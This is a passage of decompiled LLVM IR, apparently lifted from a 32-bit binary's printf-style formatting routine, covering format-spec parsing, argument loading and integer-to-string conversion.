dec_label_pc_8051850:                             ; preds = %dec_label_pc_8051850.backedge, %dec_label_pc_8051831
  %v1_8051862 = phi i32 [ %v1_805185a22, %dec_label_pc_8051850.backedge ], [ %v0_8051840, %dec_label_pc_8051831 ]
  %v0_805185e = phi i32 [ %v0_805185020, %dec_label_pc_8051850.backedge ], [ %v0_8051840, %dec_label_pc_8051831 ]
  %v4_8051850 = phi i32 [ %v4_8051850.pre, %dec_label_pc_8051850.backedge ], [ %v6_805183b, %dec_label_pc_8051831 ]
  %v1_8051850 = inttoptr i32 %v0_805185e to i8*
  %v2_8051850 = load i8, i8* %v1_8051850, align 1
  %v3_8051850 = zext i8 %v2_8051850 to i32
  %v5_8051850 = and i32 %v4_8051850, -256
  %v6_8051850 = or i32 %v3_8051850, %v5_8051850
  store i32 %v6_8051850, i32* %eax.global-to-local, align 4
  %v4_8051852 = icmp eq i8 %v2_8051850, 0
  %v5_8051852 = icmp slt i8 %v2_8051850, 0
  store i1 %v5_8051852, i1* %sf.global-to-local, align 1
  br i1 %v4_8051852, label %dec_label_pc_805185a, label %dec_label_pc_8051856

dec_label_pc_8051856:                             ; preds = %dec_label_pc_8051850
  %v2_8051856 = add i8 %v2_8051850, -37
  %v10_8051856 = icmp eq i8 %v2_8051856, 0
  %v11_8051856 = icmp slt i8 %v2_8051856, 0
  store i1 %v11_8051856, i1* %sf.global-to-local, align 1
  %v1_8051858 = icmp eq i1 %v10_8051856, false
  br i1 %v1_8051858, label %dec_label_pc_805184f, label %dec_label_pc_805185a

dec_label_pc_805185a:                             ; preds = %dec_label_pc_8051856, %dec_label_pc_8051850
  %v2_805185a = sub i32 %v0_805185e, %v1_8051862
  %v12_805185a = icmp eq i32 %v2_805185a, 0
  %v13_805185a = icmp slt i32 %v2_805185a, 0
  store i1 %v13_805185a, i1* %sf.global-to-local, align 1
  br i1 %v12_805185a, label %dec_label_pc_8051885, label %dec_label_pc_805185e

dec_label_pc_805185e:                             ; preds = %dec_label_pc_805185a
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_805185a, i32* @esi, align 4
  store i1 %v13_805185a, i1* %sf.global-to-local, align 1
  %tmp67 = icmp slt i32 %v2_805185a, 1
  br i1 %tmp67, label %dec_label_pc_805187a, label %dec_label_pc_8051868

dec_label_pc_8051868:                             ; preds = %dec_label_pc_805185e
  %v0_8051868 = load i32, i32* @ebp, align 4
  %v1_8051868 = load i32, i32* @esp, align 4
  %v2_8051868 = add i32 %v1_8051868, -4
  %v3_8051868 = inttoptr i32 %v2_8051868 to i32*
  store i32 %v0_8051868, i32* %v3_8051868, align 4
  %v1_8051869 = add i32 %v1_8051868, 368
  %v2_8051869 = inttoptr i32 %v1_8051869 to i32*
  %v3_8051869 = load i32, i32* %v2_8051869, align 4
  %v5_8051869 = add i32 %v1_8051868, -8
  %v6_8051869 = inttoptr i32 %v5_8051869 to i32*
  store i32 %v3_8051869, i32* %v6_8051869, align 4
  %v0_8051870 = load i32, i32* @esi, align 4
  %v2_8051870 = add i32 %v1_8051868, -12
  %v3_8051870 = inttoptr i32 %v2_8051870 to i32*
  store i32 %v0_8051870, i32* %v3_8051870, align 4
  %v0_8051871 = load i32, i32* %edx.global-to-local, align 4
  %v2_8051871 = add i32 %v1_8051868, -16
  %v3_8051871 = inttoptr i32 %v2_8051871 to i32*
  store i32 %v0_8051871, i32* %v3_8051871, align 4
  %v0_8051872 = load i32, i32* %stack_var_-364, align 4
  %v4_8051872 = call i32 @__stdio_fwrite(i32 %v0_8051872, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8051872, i32* %eax.global-to-local, align 4
  %v0_8051877 = load i32, i32* @esp, align 4
  %v1_8051877 = add i32 %v0_8051877, 16
  %v7_8051877 = icmp slt i32 %v1_8051877, 0
  store i1 %v7_8051877, i1* %sf.global-to-local, align 1
  %v1_805187a.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805187a

dec_label_pc_805187a:                             ; preds = %dec_label_pc_805185e, %dec_label_pc_8051868
  %v3_8051882 = phi i32 [ %v2_805185a, %dec_label_pc_805185e ], [ %v1_805187a.pre, %dec_label_pc_8051868 ]
  %v0_805187a = phi i32 [ 0, %dec_label_pc_805185e ], [ %v4_8051872, %dec_label_pc_8051868 ]
  %v2_805187a = sub i32 %v0_805187a, %v3_8051882
  %v12_805187a = icmp eq i32 %v2_805187a, 0
  %v13_805187a = icmp slt i32 %v2_805187a, 0
  store i1 %v13_805187a, i1* %sf.global-to-local, align 1
  %v1_805187c = icmp eq i1 %v12_805187a, false
  %v0_8051d73.pre.pre = load i32, i32* @esp, align 4
  br i1 %v1_805187c, label %dec_label_pc_8051d73, label %dec_label_pc_8051882

dec_label_pc_8051882:                             ; preds = %dec_label_pc_805187a
  %v1_8051882 = inttoptr i32 %v0_8051d73.pre.pre to i32*
  %v2_8051882 = load i32, i32* %v1_8051882, align 4
  %v4_8051882 = add i32 %v2_8051882, %v3_8051882
  %v15_8051882 = icmp slt i32 %v4_8051882, 0
  store i1 %v15_8051882, i1* %sf.global-to-local, align 1
  store i32 %v4_8051882, i32* %v1_8051882, align 4
  %v0_8051885.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8051885

dec_label_pc_8051885:                             ; preds = %dec_label_pc_805185a, %dec_label_pc_8051882
  %v0_8051d6b = phi i32 [ %v0_805185e, %dec_label_pc_805185a ], [ %v0_8051885.pre, %dec_label_pc_8051882 ]
  %v1_8051885 = inttoptr i32 %v0_8051d6b to i8*
  %v2_8051885 = load i8, i8* %v1_8051885, align 1
  %v3_8051885 = icmp eq i8 %v2_8051885, 0
  %v4_8051885 = icmp slt i8 %v2_8051885, 0
  store i1 %v4_8051885, i1* %sf.global-to-local, align 1
  br i1 %v3_8051885, label %dec_label_pc_8051d7a, label %dec_label_pc_805188e

dec_label_pc_805188e:                             ; preds = %dec_label_pc_8051885
  %v1_805188e = add i32 %v0_8051d6b, 1
  %v2_805188e = inttoptr i32 %v1_805188e to i8*
  %v3_805188e = load i8, i8* %v2_805188e, align 1
  %v4_805188e = add i8 %v3_805188e, -37
  %v12_805188e = icmp eq i8 %v4_805188e, 0
  %v13_805188e = icmp slt i8 %v4_805188e, 0
  store i1 %v13_805188e, i1* %sf.global-to-local, align 1
  store i32 %v1_805188e, i32* %edx.global-to-local, align 4
  br i1 %v12_805188e, label %dec_label_pc_8051d6b, label %dec_label_pc_805189b

dec_label_pc_805189b:                             ; preds = %dec_label_pc_805188e
  %v1_805189b = load i32, i32* @esp, align 4
  %v2_805189b = add i32 %v1_805189b, 16
  %v3_805189b = inttoptr i32 %v2_805189b to i32*
  store i32 %v1_805188e, i32* %v3_805189b, align 4
  %v0_805189f = load i32, i32* @esp, align 4
  %v1_805189f = add i32 %v0_805189f, 340
  %v2_805189f = inttoptr i32 %v1_805189f to i32*
  store i32 0, i32* %v2_805189f, align 4
  %v0_80518aa = load i32, i32* @esp, align 4
  %v1_80518aa = add i32 %v0_80518aa, -12
  %v10_80518aa = icmp slt i32 %v1_80518aa, 0
  store i1 %v10_80518aa, i1* %sf.global-to-local, align 1
  %v1_80518ad = add i32 %v0_80518aa, 16
  store i32 %v1_80518ad, i32* @ebx, align 4
  %v2_80518b1 = add i32 %v0_80518aa, -16
  %v3_80518b1 = inttoptr i32 %v2_80518b1 to i32*
  store i32 %v1_80518ad, i32* %v3_80518b1, align 4
  %v0_80518b2 = load i32, i32* %stack_var_-364, align 4
  %v1_80518b2 = inttoptr i32 %v0_80518b2 to i32*
  %v2_80518b2 = call i32 @_ppfs_parsespec(i32* %v1_80518b2)
  store i32 %v2_80518b2, i32* %eax.global-to-local, align 4
  %v0_80518b7 = load i32, i32* @ebx, align 4
  %v1_80518b7 = load i32, i32* @esp, align 4
  %v2_80518b7 = inttoptr i32 %v1_80518b7 to i32*
  store i32 %v0_80518b7, i32* %v2_80518b7, align 4
  %v0_80518ba = load i32, i32* %stack_var_-364, align 4
  %v1_80518ba = call i32 @_ppfs_setargs(i32 %v0_80518ba)
  store i32 %v1_80518ba, i32* %eax.global-to-local, align 4
  %v0_80518bf = load i32, i32* @esp, align 4
  %v1_80518bf = add i32 %v0_80518bf, 70
  %v2_80518bf = inttoptr i32 %v1_80518bf to i8*
  %v3_80518bf = load i8, i8* %v2_80518bf, align 1
  %v4_80518bf = zext i8 %v3_80518bf to i32
  store i32 %v4_80518bf, i32* @edi, align 4
  %v1_80518c4 = add i32 %v0_80518bf, 16
  %v1_80518c7 = add i32 %v0_80518bf, 56
  %v2_80518c7 = inttoptr i32 %v1_80518c7 to i32*
  %v3_80518c7 = load i32, i32* %v2_80518c7, align 4
  %v5_80518c7 = icmp slt i32 %v3_80518c7, 0
  store i1 %v5_80518c7, i1* %sf.global-to-local, align 1
  %v1_80518cc = add i32 %v0_80518bf, 112
  store i32 %v1_80518cc, i32* %edx.global-to-local, align 4
  %tmp68 = icmp slt i32 %v3_80518c7, 1
  br i1 %tmp68, label %dec_label_pc_80518d9, label %dec_label_pc_80518d2

dec_label_pc_80518d2:                             ; preds = %dec_label_pc_805189b
  %v2_80518d2 = zext i8 %v3_80518bf to i32
  %v3_80518d2 = mul nuw nsw i32 %v2_80518d2, 12
  store i32 %v3_80518d2, i32* %eax.global-to-local, align 4
  %v2_80518d5 = add i32 %v0_80518bf, 100
  %v3_80518d5 = add i32 %v2_80518d5, %v3_80518d2
  store i32 %v3_80518d5, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80518d9

dec_label_pc_80518d9:                             ; preds = %dec_label_pc_805189b, %dec_label_pc_80518d2
  %v0_80518e129 = phi i32 [ %v1_80518cc, %dec_label_pc_805189b ], [ %v3_80518d5, %dec_label_pc_80518d2 ]
  %v1_80518d9 = add i32 %v0_80518bf, 60
  %v2_80518d9 = inttoptr i32 %v1_80518d9 to i32*
  %v3_80518d9 = load i32, i32* %v2_80518d9, align 4
  store i32 %v3_80518d9, i32* %ecx.global-to-local, align 4
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_80518ec74 = sub i32 0, %v3_80518d9
  %v10_80518ec77 = and i32 %v3_80518d9, %v2_80518ec74
  %v11_80518ec78 = icmp slt i32 %v10_80518ec77, 0
  %v13_80518ec79 = icmp slt i32 %v2_80518ec74, 0
  %v2_80518ee80 = icmp eq i1 %v13_80518ec79, %v11_80518ec78
  br i1 %v2_80518ee80, label %dec_label_pc_80518f0, label %dec_label_pc_80518e1

dec_label_pc_80518e1:                             ; preds = %dec_label_pc_80518d9, %dec_label_pc_80518e1
  %v0_80518f084 = phi i32 [ %v0_80518f0, %dec_label_pc_80518e1 ], [ %v1_80518c4, %dec_label_pc_80518d9 ]
  %v2_80518e183 = phi i32 [ %v1_80518eb, %dec_label_pc_80518e1 ], [ 0, %dec_label_pc_80518d9 ]
  %v0_80518e182 = phi i32 [ %v1_80518e8, %dec_label_pc_80518e1 ], [ %v0_80518e129, %dec_label_pc_80518d9 ]
  %v3_80518e1 = mul i32 %v2_80518e183, 4
  %v4_80518e1 = add i32 %v3_80518e1, 344
  %v5_80518e1 = add i32 %v4_80518e1, %v0_80518f084
  %v6_80518e1 = inttoptr i32 %v5_80518e1 to i32*
  store i32 %v0_80518e182, i32* %v6_80518e1, align 4
  %v0_80518e8 = load i32, i32* %edx.global-to-local, align 4
  %v1_80518e8 = add i32 %v0_80518e8, 12
  store i32 %v1_80518e8, i32* %edx.global-to-local, align 4
  %v0_80518eb = load i32, i32* %eax.global-to-local, align 4
  %v1_80518eb = add i32 %v0_80518eb, 1
  %v1_80518ec.pre = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v1_80518eb, i32* %eax.global-to-local, align 4
  %v2_80518ec = sub i32 %v1_80518eb, %v1_80518ec.pre
  %v8_80518ec = xor i32 %v1_80518eb, %v1_80518ec.pre
  %v9_80518ec = xor i32 %v2_80518ec, %v1_80518eb
  %v10_80518ec = and i32 %v9_80518ec, %v8_80518ec
  %v11_80518ec = icmp slt i32 %v10_80518ec, 0
  %v13_80518ec = icmp slt i32 %v2_80518ec, 0
  %v2_80518ee = icmp eq i1 %v13_80518ec, %v11_80518ec
  %v0_80518f0 = load i32, i32* @esp, align 4
  br i1 %v2_80518ee, label %dec_label_pc_80518f0, label %dec_label_pc_80518e1

dec_label_pc_80518f0:                             ; preds = %dec_label_pc_80518e1, %dec_label_pc_80518d9
  %v0_80518f0.lcssa = phi i32 [ %v1_80518c4, %dec_label_pc_80518d9 ], [ %v0_80518f0, %dec_label_pc_80518e1 ]
  %v1_80518f0 = add i32 %v0_80518f0.lcssa, 48
  %v2_80518f0 = inttoptr i32 %v1_80518f0 to i32*
  %v3_80518f0 = load i32, i32* %v2_80518f0, align 4
  store i32 %v3_80518f0, i32* @ecx, align 4
  %v1_80518f4 = icmp eq i32 %v3_80518f0, 0
  %v2_80518f4 = icmp slt i32 %v3_80518f0, 0
  store i1 %v2_80518f4, i1* %sf.global-to-local, align 1
  %v1_80518f6 = icmp eq i1 %v1_80518f4, false
  br i1 %v1_80518f6, label %dec_label_pc_805191e, label %dec_label_pc_80518f8

dec_label_pc_80518f8:                             ; preds = %dec_label_pc_80518f0
  %v1_80518f8 = inttoptr i32 %v0_80518f0.lcssa to i32*
  %v2_80518f8 = load i32, i32* %v1_80518f8, align 4
  store i32 %v2_80518f8, i32* %eax.global-to-local, align 4
  %v1_80518fb = ashr i32 %v2_80518f8, 31
  store i32 %v1_80518fb, i32* %edx.global-to-local, align 4
  %v2_80518fc = add i32 %v0_80518f0.lcssa, -4
  %v3_80518fc = inttoptr i32 %v2_80518fc to i32*
  store i32 %v1_80518fb, i32* %v3_80518fc, align 4
  %v0_80518fd = load i32, i32* %eax.global-to-local, align 4
  %v2_80518fd = add i32 %v0_80518f0.lcssa, -8
  %v3_80518fd = inttoptr i32 %v2_80518fd to i32*
  store i32 %v0_80518fd, i32* %v3_80518fd, align 4
  %v1_80518fe = add i32 %v0_80518f0.lcssa, 32
  %v2_80518fe = inttoptr i32 %v1_80518fe to i32*
  %v3_80518fe = load i32, i32* %v2_80518fe, align 4
  %v1_8051902 = and i32 %v3_80518fe, 3840
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 %v1_8051902, i32* %eax.global-to-local, align 4
  %v2_8051907 = add i32 %v0_80518f0.lcssa, -12
  %v3_8051907 = inttoptr i32 %v2_8051907 to i32*
  store i32 %v1_8051902, i32* %v3_8051907, align 4
  %v1_8051908 = add i32 %v0_80518f0.lcssa, 344
  %v2_8051908 = inttoptr i32 %v1_8051908 to i32*
  %v3_8051908 = load i32, i32* %v2_8051908, align 4
  store i32 %v3_8051908, i32* %eax.global-to-local, align 4
  %v1_805190f = inttoptr i32 %v3_8051908 to i32*
  %v2_805190f = load i32, i32* %v1_805190f, align 4
  %v4_805190f = add i32 %v0_80518f0.lcssa, -16
  %v5_805190f = inttoptr i32 %v4_805190f to i32*
  store i32 %v2_805190f, i32* %v5_805190f, align 4
  %v0_8051911 = call i32 @_store_inttype()
  store i32 %v0_8051911, i32* %eax.global-to-local, align 4
  %v0_8051916 = load i32, i32* @esp, align 4
  %v1_8051916 = add i32 %v0_8051916, 16
  %v7_8051916 = icmp slt i32 %v1_8051916, 0
  store i1 %v7_8051916, i1* %sf.global-to-local, align 1
  br label %dec_label_pc_8051d60

dec_label_pc_805191e:                             ; preds = %dec_label_pc_80518f0
  %v1_805191e = add i32 %v3_80518f0, -7
  %v5_805191e = icmp ult i32 %v3_80518f0, 7
  %v9_805191e = icmp eq i32 %v1_805191e, 0
  %v10_805191e = icmp slt i32 %v1_805191e, 0
  store i1 %v10_805191e, i1* %sf.global-to-local, align 1
  %v2_8051921 = or i1 %v5_805191e, %v9_805191e
  br i1 %v2_8051921, label %dec_label_pc_8051927, label %dec_label_pc_8051a8b

dec_label_pc_8051927:                             ; preds = %dec_label_pc_805191e
  %v1_8051927 = add i32 %v3_80518f0, 134585552
  %v2_8051927 = inttoptr i32 %v1_8051927 to i8*
  %v3_8051927 = load i8, i8* %v2_8051927, align 1
  %v4_8051927 = sext i8 %v3_8051927 to i32
  store i32 %v4_8051927, i32* @esi, align 4
  store i32 87, i32* @ebx, align 4
  %v9_8051933 = icmp eq i8 %v3_8051927, 10
  %v10_8051933 = icmp slt i8 %v3_8051927, 10
  store i1 %v10_8051933, i1* %sf.global-to-local, align 1
  %v1_8051936 = icmp eq i1 %v9_8051933, false
  br i1 %v1_8051936, label %dec_label_pc_8051956, label %dec_label_pc_8051938

dec_label_pc_8051938:                             ; preds = %dec_label_pc_8051927
  %v1_8051938 = add i32 %v0_80518f0.lcssa, 32
  %v2_8051938 = inttoptr i32 %v1_8051938 to i32*
  %v3_8051938 = load i32, i32* %v2_8051938, align 4
  store i32 %v3_8051938, i32* %eax.global-to-local, align 4
  %v1_805193e = udiv i32 %v3_8051938, 32
  %tmp69 = urem i32 %v1_805193e, 2
  %tmp70 = sub nsw i32 45, %tmp69
  %v2_805194e = or i32 %tmp70, 128
  store i32 %v2_805194e, i32* %edx.global-to-local, align 4
  %v2_8051951 = and i32 %v3_8051938, 64
  %v3_8051951 = icmp eq i32 %v2_8051951, 0
  store i1 false, i1* %sf.global-to-local, align 1
  %v1_8051953 = icmp eq i1 %v3_8051951, false
  %v4_8051953 = select i1 %v1_8051953, i32 %v2_805194e, i32 %tmp70
  store i32 %v4_8051953, i32* @ebx, align 4
  br label %dec_label_pc_8051956

dec_label_pc_8051956:                             ; preds = %dec_label_pc_8051927, %dec_label_pc_8051938
  %v1_8051956 = add i32 %v3_80518f0, -5
  %v5_8051956 = icmp ult i32 %v3_80518f0, 5
  %v9_8051956 = icmp eq i32 %v1_8051956, 0
  %v10_8051956 = icmp slt i32 %v1_8051956, 0
  store i1 %v10_8051956, i1* %sf.global-to-local, align 1
  %v2_8051959 = or i1 %v5_8051956, %v9_8051956
  br i1 %v2_8051959, label %dec_label_pc_805195b, label %dec_label_pc_8051973

dec_label_pc_805195b:                             ; preds = %dec_label_pc_8051956
  %v1_805195b = add i32 %v3_80518f0, -3
  %v9_805195b = icmp eq i32 %v1_805195b, 0
  %v10_805195b = icmp slt i32 %v1_805195b, 0
  store i1 %v10_805195b, i1* %sf.global-to-local, align 1
  %v1_805195e = icmp eq i1 %v9_805195b, false
  br i1 %v1_805195e, label %dec_label_pc_8051967, label %dec_label_pc_8051960

dec_label_pc_8051960:                             ; preds = %dec_label_pc_805195b
  store i32 55, i32* @ebx, align 4
  br label %dec_label_pc_8051975

dec_label_pc_8051967:                             ; preds = %dec_label_pc_805195b
  %v1_8051967 = add i32 %v3_80518f0, -1
  %v9_8051967 = icmp eq i32 %v1_8051967, 0
  %v10_8051967 = icmp slt i32 %v1_8051967, 0
  store i1 %v10_8051967, i1* %sf.global-to-local, align 1
  br i1 %v9_8051967, label %dec_label_pc_805197a, label %dec_label_pc_8051975

dec_label_pc_8051973:                             ; preds = %dec_label_pc_8051956
  %v1_8051973 = sub nsw i32 0, %v4_8051927
  %v7_8051973 = icmp sgt i8 %v3_8051927, 0
  store i1 %v7_8051973, i1* %sf.global-to-local, align 1
  store i32 %v1_8051973, i32* @esi, align 4
  br label %dec_label_pc_8051975

dec_label_pc_8051975:                             ; preds = %dec_label_pc_8051967, %dec_label_pc_8051960, %dec_label_pc_8051973
  br label %dec_label_pc_805197a

dec_label_pc_805197a:                             ; preds = %dec_label_pc_8051967, %dec_label_pc_8051975
  %storemerge = phi i32 [ 11, %dec_label_pc_8051975 ], [ 6, %dec_label_pc_8051967 ]
  store i32 %storemerge, i32* @ebp, align 4
  %v1_805197a = add i32 %v0_80518f0.lcssa, 20
  %v2_805197a = inttoptr i32 %v1_805197a to i32*
  %v3_805197a = load i32, i32* %v2_805197a, align 4
  %v5_805197a = icmp slt i32 %v3_805197a, 0
  store i1 %v5_805197a, i1* %sf.global-to-local, align 1
  %v1_805197f = add i32 %v0_80518f0.lcssa, 7
  %v2_805197f = inttoptr i32 %v1_805197f to i8*
  store i8 32, i8* %v2_805197f, align 1
  %v0_8051984 = load i1, i1* %sf.global-to-local, align 1
  %v1_8051984 = icmp eq i1 %v0_8051984, false
  br i1 %v1_8051984, label %dec_label_pc_805198e, label %dec_label_pc_8051986

dec_label_pc_8051986:                             ; preds = %dec_label_pc_805197a
  %v0_8051986 = load i32, i32* @esp, align 4
  %v1_8051986 = add i32 %v0_8051986, 36
  %v2_8051986 = inttoptr i32 %v1_8051986 to i8*
  %v3_8051986 = load i8, i8* %v2_8051986, align 1
  %v4_8051986 = zext i8 %v3_8051986 to i32
  %v5_8051986 = load i32, i32* %edx.global-to-local, align 4
  %v6_8051986 = and i32 %v5_8051986, -256
  %v7_8051986 = or i32 %v6_8051986, %v4_8051986
  store i32 %v7_8051986, i32* %edx.global-to-local, align 4
  %v3_805198a = add i32 %v0_8051986, 7
  %v4_805198a = inttoptr i32 %v3_805198a to i8*
  store i8 %v3_8051986, i8* %v4_805198a, align 1
  br label %dec_label_pc_805198e

dec_label_pc_805198e:                             ; preds = %dec_label_pc_805197a, %dec_label_pc_8051986
  %v1_805198e = add i32 %v3_80518f0, -1
  %v8_805198e = icmp eq i32 %v1_805198e, 0
  %v9_805198e = icmp slt i32 %v1_805198e, 0
  store i1 %v9_805198e, i1* %sf.global-to-local, align 1
  store i32 %v1_805198e, i32* %ecx.global-to-local, align 4
  %v0_805198f = load i32, i32* @esp, align 4
  %v1_805198f = add i32 %v0_805198f, 344
  %v2_805198f = inttoptr i32 %v1_805198f to i32*
  %v3_805198f = load i32, i32* %v2_805198f, align 4
  store i32 %v3_805198f, i32* %eax.global-to-local, align 4
  store i32 1024, i32* %edx.global-to-local, align 4
  %v0_80519a7.pre = load i32, i32* @edi, align 4
  br i1 %v8_805198e, label %dec_label_pc_80519a7, label %dec_label_pc_805199d

dec_label_pc_805199d:                             ; preds = %dec_label_pc_805198e
  %v2_805199d = mul i32 %v0_80519a7.pre, 4
  %v3_805199d = add i32 %v0_805198f, 52
  %v4_805199d = add i32 %v3_805199d, %v2_805199d
  %v5_805199d = inttoptr i32 %v4_805199d to i32*
  %v6_805199d = load i32, i32* %v5_805199d, align 4
  %v1_80519a1 = and i32 %v6_805199d, 3840
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 %v1_80519a1, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80519a7

dec_label_pc_80519a7:                             ; preds = %dec_label_pc_805198e, %dec_label_pc_805199d
  %v2_80519a7 = add i32 %v0_805198f, -4
  %v3_80519a7 = inttoptr i32 %v2_80519a7 to i32*
  store i32 %v0_80519a7.pre, i32* %v3_80519a7, align 4
  %v0_80519a8 = load i32, i32* @esi, align 4
  %v2_80519a8 = add i32 %v0_805198f, -8
  %v3_80519a8 = inttoptr i32 %v2_80519a8 to i32*
  store i32 %v0_80519a8, i32* %v3_80519a8, align 4
  %v0_80519a9 = load i32, i32* %eax.global-to-local, align 4
  %v2_80519a9 = add i32 %v0_805198f, -12
  %v3_80519a9 = inttoptr i32 %v2_80519a9 to i32*
  store i32 %v0_80519a9, i32* %v3_80519a9, align 4
  %v0_80519aa = load i32, i32* %edx.global-to-local, align 4
  %v2_80519aa = add i32 %v0_805198f, -16
  %v3_80519aa = inttoptr i32 %v2_80519aa to i32*
  store i32 %v0_80519aa, i32* %v3_80519aa, align 4
  %v0_80519ab = call i32 @_load_inttype()
  %v0_80519b0 = load i32, i32* @ebx, align 4
  %v1_80519b0 = load i32, i32* @esp, align 4
  %v2_80519b0 = inttoptr i32 %v1_80519b0 to i32*
  store i32 %v0_80519b0, i32* %v2_80519b0, align 4
  %v0_80519b3 = load i32, i32* @esi, align 4
  %v1_80519b3 = load i32, i32* @esp, align 4
  %v2_80519b3 = add i32 %v1_80519b3, -4
  %v3_80519b3 = inttoptr i32 %v2_80519b3 to i32*
  store i32 %v0_80519b3, i32* %v3_80519b3, align 4
  %v0_80519b4 = load i32, i32* @edx, align 4
  %v2_80519b4 = add i32 %v1_80519b3, -8
  %v3_80519b4 = inttoptr i32 %v2_80519b4 to i32*
  store i32 %v0_80519b4, i32* %v3_80519b4, align 4
  %v2_80519b5 = add i32 %v1_80519b3, -12
  %v3_80519b5 = inttoptr i32 %v2_80519b5 to i32*
  store i32 %v0_80519ab, i32* %v3_80519b5, align 4
  %v1_80519b6 = add i32 %v1_80519b3, 347
  store i32 %v1_80519b6, i32* %eax.global-to-local, align 4
  %v2_80519bd = add i32 %v1_80519b3, -16
  %v3_80519bd = inttoptr i32 %v2_80519bd to i32*
  store i32 %v1_80519b6, i32* %v3_80519bd, align 4
  %v0_80519be = load i32, i32* %stack_var_-364, align 4
  %v5_80519be = inttoptr i32 %v0_80519be to i8*
  %v6_80519be = call i32 @_uintmaxtostr(i8* %v5_80519be, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_80519be, i32* %eax.global-to-local, align 4
  %v0_80519c3 = load i32, i32* @esp, align 4
  %v1_80519c3 = add i32 %v0_80519c3, 32
  %v1_80519c6 = add i32 %v0_80519c3, 80
  %v2_80519c6 = inttoptr i32 %v1_80519c6 to i32*
  %v3_80519c6 = load i32, i32* %v2_80519c6, align 4
  %v4_80519c6 = add i32 %v3_80519c6, -5
  %v8_80519c6 = icmp ult i32 %v3_80519c6, 5
  %v12_80519c6 = icmp eq i32 %v4_80519c6, 0
  %v13_80519c6 = icmp slt i32 %v4_80519c6, 0
  store i1 %v13_80519c6, i1* %sf.global-to-local, align 1
  store i32 %v6_80519be, i32* @edi, align 4
  %v2_80519cd = or i1 %v8_80519c6, %v12_80519c6
  br i1 %v2_80519cd, label %dec_label_pc_80519f7, label %dec_label_pc_80519cf

dec_label_pc_80519cf:                             ; preds = %dec_label_pc_80519a7
  %v7_80519be = inttoptr i32 %v6_80519be to i8*
  %v3_80519cf = load i8, i8* %v7_80519be, align 1
  %v4_80519cf = add i8 %v3_80519cf, -45
  %v12_80519cf = icmp eq i8 %v4_80519cf, 0
  %v13_80519cf = icmp slt i8 %v4_80519cf, 0
  store i1 %v13_80519cf, i1* %sf.global-to-local, align 1
  %v1_80519d2 = icmp eq i1 %v12_80519cf, false
  %v1_80519e1 = add i32 %v0_80519c3, 64
  %v2_80519e1 = inttoptr i32 %v1_80519e1 to i32*
  %v3_80519e1 = load i32, i32* %v2_80519e1, align 4
  br i1 %v1_80519d2, label %dec_label_pc_80519e1, label %dec_label_pc_80519d4

dec_label_pc_80519d4:                             ; preds = %dec_label_pc_80519cf
  %v4_80519d4 = or i32 %v3_80519e1, 2
  store i32 %v4_80519d4, i32* %v2_80519e1, align 4
  %v0_80519d9 = load i32, i32* @edi, align 4
  %v1_80519d9 = add i32 %v0_80519d9, 1
  %v9_80519d9 = icmp slt i32 %v1_80519d9, 0
  store i1 %v9_80519d9, i1* %sf.global-to-local, align 1
  store i32 %v1_80519d9, i32* @edi, align 4
  store i32 2, i32* @ebp, align 4
  %v0_80519f7.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80519f7

dec_label_pc_80519e1:                             ; preds = %dec_label_pc_80519cf
  store i32 %v3_80519e1, i32* %eax.global-to-local, align 4
  %v2_80519e5 = and i32 %v3_80519e1, 2
  %v3_80519e5 = icmp eq i32 %v2_80519e5, 0
  store i1 false, i1* %sf.global-to-local, align 1
  br i1 %v3_80519e5, label %dec_label_pc_80519ed, label %dec_label_pc_80519e9

dec_label_pc_80519e9:                             ; preds = %dec_label_pc_80519e1
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_80519f7

dec_label_pc_80519ed:                             ; preds = %dec_label_pc_80519e1
  %v2_80519ed = urem i32 %v3_80519e1, 2
  %v3_80519ed = icmp eq i32 %v2_80519ed, 0
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 4, i32* %eax.global-to-local, align 4
  %v1_80519f4 = icmp eq i1 %v3_80519ed, false
  %v2_80519f4 = load i32, i32* @ebp, align 4
  %v4_80519f4 = select i1 %v1_80519f4, i32 4, i32 %v2_80519f4
  store i32 %v4_80519f4, i32* @ebp, align 4
  br label %dec_label_pc_80519f7

dec_label_pc_80519f7:                             ; preds = %dec_label_pc_80519a7, %dec_label_pc_80519e9, %dec_label_pc_80519d4, %dec_label_pc_80519ed
  %v0_8051a49 = phi i32 [ %v6_80519be, %dec_label_pc_80519a7 ], [ %v6_80519be, %dec_label_pc_80519e9 ], [ %v1_80519d9, %dec_label_pc_80519d4 ], [ %v6_80519be, %dec_label_pc_80519ed ]
  %v0_8051a59 = phi i32 [ %v1_80519c3, %dec_label_pc_80519a7 ], [ %v1_80519c3, %dec_label_pc_80519e9 ], [ %v0_80519f7.pre, %dec_label_pc_80519d4 ], [ %v1_80519c3, %dec_label_pc_80519ed ]
  %v1_80519f7 = add i32 %v0_8051a59, 20
  %v2_80519f7 = inttoptr i32 %v1_80519f7 to i32*
  %v3_80519f7 = load i32, i32* %v2_80519f7, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v1_80519fb = sub i32 204, %v0_8051a49
  %v2_8051a07 = add i32 %v1_80519fb, %v0_8051a59
  %v1_8051a09 = add i32 %v2_8051a07, 127
  store i32 %v1_8051a09, i32* @esi, align 4
  %v2_8051a0c = icmp slt i32 %v3_80519f7, 0
  store i1 %v2_8051a0c, i1* %sf.global-to-local, align 1
  %v3_8051a0e = select i1 %v2_8051a0c, i32 1, i32 %v3_80519f7
  store i32 %v3_8051a0e, i32* %ecx.global-to-local, align 4
  %v1_8051a11 = add i32 %v0_8051a59, 32
